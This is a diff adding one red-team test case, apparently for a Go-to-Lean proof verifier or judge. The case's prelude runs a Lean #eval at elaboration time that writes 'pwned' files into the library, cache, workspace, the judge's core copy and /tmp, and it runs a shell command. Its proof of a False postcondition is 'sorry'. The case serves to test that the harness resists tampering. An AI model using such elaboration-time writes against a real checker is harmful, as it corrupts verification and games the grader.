@@ -1,0 +1,10 @@
+[
+  {
+    "func": "Max2",
+    "name": "eval_writes",
+    "post": "False",
+    "prelude": "#eval show IO Unit from do\n  let home := (← IO.getEnv \"HOME\").getD \"/nonexistent\"\n  let root := (← IO.getEnv \"GO2LEAN_REDTEAM_ROOT\").getD \"/nonexistent\"\n  for p in [s!\"{root}/lean/Go2Lean/Proof/Pwned.lean\", s!\"{home}/.cache/go2lean/pwned\", \"Go2Lean/Generated/gossa/pwned.lean\", \"core/Go2Lean/Proof/Pwned.lean\", \"/tmp/go2lean-redteam-pwned\"] do\n    try IO.FS.writeFile p \"pwned\" catch _ => pure ()\n  let o ← (IO.Process.output { cmd := \"sh\", args := #[\"-c\", s!\"echo pwned > {root}/lean/pwned-sh\"] }).toBaseIO\n  match o with | _ => pure ()",
+    "proof": "  exact sorry",
+    "attack": "#eval at elaboration writing files: the checkout's library, go2lean's cache, the workspace's model, the judge's core copy and /tmp (scripts/redteam.sh checks that none changed)."
+  }
+]
